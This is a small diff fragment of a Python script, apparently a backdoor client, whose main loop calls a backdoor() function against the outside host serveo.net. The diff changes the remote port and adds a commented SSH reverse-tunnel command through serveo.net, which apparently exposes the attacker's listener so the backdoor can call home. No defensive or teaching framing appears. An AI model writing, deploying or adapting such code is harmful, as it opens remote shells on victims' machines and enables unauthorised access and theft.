@@ -175,8 +175,10 @@ if __name__ == "__main__":
 
         while True:
             REMOTE_HOST = 'serveo.net'
-            REMOTE_PORT = 55000
+            REMOTE_PORT = 55001
 
             backdoor(REMOTE_HOST, REMOTE_PORT)
     except Exception:
         print("exit")
+
+#ssh -R 55000:localhost:55000 serveo.net
